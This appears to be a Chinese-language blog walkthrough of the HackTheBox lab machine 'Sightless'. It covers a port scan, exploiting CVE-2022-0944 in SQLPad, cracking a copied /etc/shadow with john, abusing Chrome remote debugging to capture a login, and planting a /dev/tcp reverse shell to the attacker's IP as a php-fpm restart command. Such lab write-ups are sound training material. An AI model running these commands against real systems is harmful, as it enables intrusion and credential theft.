@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all蠻喜歡這台機器，算 real world 又有一些 rabbit holeVictim’s IP : 10.10.11.32Victim’s Host : *.sightless.htbAttacker’s IP : 10.10.14.114   RECONport scanCommand   1rustscan -a 10.10.11.32 --ulimit 5000 --">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sightless on HackTheBox">
+<meta property="og:url" content="http://wha13.github.io/2024/12/18/sightless-htb/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all蠻喜歡這台機器，算 real world 又有一些 rabbit holeVictim’s IP : 10.10.11.32Victim’s Host : *.sightless.htbAttacker’s IP : 10.10.14.114   RECONport scanCommand   1rustscan -a 10.10.11.32 --ulimit 5000 --">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkuCtleBkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJV-k-gHkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkxC1-er1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJEdebxByl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk45e-xHJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1UzbWxrJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkMBZblBkx.png">
+<meta property="article:published_time" content="2024-12-19T03:11:05.000Z">
+<meta property="article:modified_time" content="2025-02-02T14:34:28.679Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Chrome">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rkuCtleBkl.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Sightless on HackTheBox</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/19/vintage-htb/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/14/htb-certified/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/18/sightless-htb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/18/sightless-htb/&text=Sightless on HackTheBox"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/18/sightless-htb/&is_video=false&description=Sightless on HackTheBox"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sightless on HackTheBox&body=Check out this article: http://wha13.github.io/2024/12/18/sightless-htb/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/18/sightless-htb/&name=Sightless on HackTheBox&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/18/sightless-htb/&t=Sightless on HackTheBox"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subdomain-discovery"><span class="toc-number">2.2.</span> <span class="toc-text">subdomain discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-0944"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2022-0944</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-shadow-cracking"><span class="toc-number">4.1.</span> <span class="toc-text">&#x2F;etc&#x2F;shadow cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-chrome-debug"><span class="toc-number">4.2.</span> <span class="toc-text">Abusing chrome debug</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Sightless on HackTheBox
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-19T03:11:05.000Z" class="dt-published" itemprop="datePublished">2024-12-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chrome/" rel="tag">Chrome</a>, <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>蠻喜歡這台機器，算 real world 又有一些 rabbit hole<br>Victim’s IP : 10.10.11.32<br>Victim’s Host : *.sightless.htb<br>Attacker’s IP : 10.10.14.114  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.11.32 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 63</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]</span><br><span class="line">|     Invalid command: try being more creative</span><br><span class="line">|_    Invalid command: try being more creative</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=</span><br><span class="line">|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-title: Sightless.htb</span><br></pre></td></tr></table></figure>
+<p>簡言之，有ssh&#x2F;ftp&#x2F;http services  </p>
+<h3 id="subdomain-discovery"><a href="#subdomain-discovery" class="headerlink" title="subdomain discovery"></a>subdomain discovery</h3><p><img src="https://hackmd.io/_uploads/rkuCtleBkl.png" alt="image"><br>連上 sightless.htb 後點擊按鈕，找到<code>sqlpad.sightless.htb</code>  </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="CVE-2022-0944"><a href="#CVE-2022-0944" class="headerlink" title="CVE-2022-0944"></a>CVE-2022-0944</h3><p>點下 About，找到版本：<code>Version: 6.10.0</code><br>適用於PoC <a target="_blank" rel="noopener" href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main</a><br>Get Shell，不過在一個 Docker 環境內：<br><img src="https://hackmd.io/_uploads/HJV-k-gHkl.png" alt="image">  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="etc-shadow-cracking"><a href="#etc-shadow-cracking" class="headerlink" title="&#x2F;etc&#x2F;shadow cracking"></a>&#x2F;etc&#x2F;shadow cracking</h3><p>於容器內獲得 &#x2F;etc&#x2F;shadow 檔案及 &#x2F;etc&#x2F;passwd 檔案，載到攻擊者主機後利用 unshadow 及 john 進行字典攻擊  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; etc_hash</span><br><span class="line">john etc_hash --wordlist=/home/kali/rockyou.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blindside        (root)     </span><br><span class="line">insaneclownposse (michael)</span><br></pre></td></tr></table></figure>
+<p>最後 michael 的權限可透過ssh登入成功  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@sightless.htb</span><br></pre></td></tr></table></figure>
+<h3 id="Abusing-chrome-debug"><a href="#Abusing-chrome-debug" class="headerlink" title="Abusing chrome debug"></a>Abusing chrome debug</h3><p>以ssh進入主機後找到chrome debug開啟的狀況<br><img src="https://hackmd.io/_uploads/SkxC1-er1x.png" alt="image"><br>用 <code>ss -tulnp</code> 命令挖掘到內網的8080 port有服務，以 ssh port forward 到本機：<br>內網 port 分布：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port   Process   </span><br><span class="line">udp     UNCONN   0        0          127.0.0.53%lo:53              0.0.0.0:*                </span><br><span class="line">udp     UNCONN   0        0                0.0.0.0:68              0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        511              0.0.0.0:80              0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        4096           127.0.0.1:3000            0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22              0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        5              127.0.0.1:33415           0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        70             127.0.0.1:33060           0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        511            127.0.0.1:8080            0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        4096           127.0.0.1:46671           0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        10             127.0.0.1:46497           0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        4096       127.0.0.53%lo:53              0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        151            127.0.0.1:3306            0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        128                    *:21                    *:*                </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22                 [::]:*</span><br></pre></td></tr></table></figure>
+<p>port forward:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8080:localhost:8080 michael@sightless.htb</span><br></pre></td></tr></table></figure>
+<p>同樣的方法把 port 33415, 46671 及 46497 也一起串出來<br>參考網路資料，先於chrome開啟<code>chrome://inspect/#devices</code>連結，點下configure並把剛剛幾個port以ip 127.0.0.1 加入紀錄<br><img src="https://hackmd.io/_uploads/rJEdebxByl.png" alt="image"><br>過沒多久就可以抓到連線請求，點下 inspect，從畫面中找到網站登入密碼：<br><img src="https://hackmd.io/_uploads/rk45e-xHJx.png" alt="image"><br>登入後可以到<code>http://admin.sightless.htb:8080/admin_phpsettings.php?page=fpmdaemons</code>修改 php-fpm 重啟命令，如果直接改成reverse shell會被提示到格式不符<br>先在本機的 <code>/tmp/rev.sh</code> 建立reverse shell內容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/10.10.14.114/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>最後只需要 <code>chmod +x /tmp/rev.sh</code>，然後把命令改成<code>/tmp/rev.sh</code>就好惹<br><img src="https://hackmd.io/_uploads/H1UzbWxrJl.png" alt="image"><br>於主機 port 9999 get root!<br><img src="https://hackmd.io/_uploads/rkMBZblBkx.png" alt="image">  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subdomain-discovery"><span class="toc-number">2.2.</span> <span class="toc-text">subdomain discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-0944"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2022-0944</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-shadow-cracking"><span class="toc-number">4.1.</span> <span class="toc-text">&#x2F;etc&#x2F;shadow cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-chrome-debug"><span class="toc-number">4.2.</span> <span class="toc-text">Abusing chrome debug</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/18/sightless-htb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/18/sightless-htb/&text=Sightless on HackTheBox"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/18/sightless-htb/&is_video=false&description=Sightless on HackTheBox"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sightless on HackTheBox&body=Check out this article: http://wha13.github.io/2024/12/18/sightless-htb/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/18/sightless-htb/&title=Sightless on HackTheBox"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/18/sightless-htb/&name=Sightless on HackTheBox&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/18/sightless-htb/&t=Sightless on HackTheBox"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2026
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
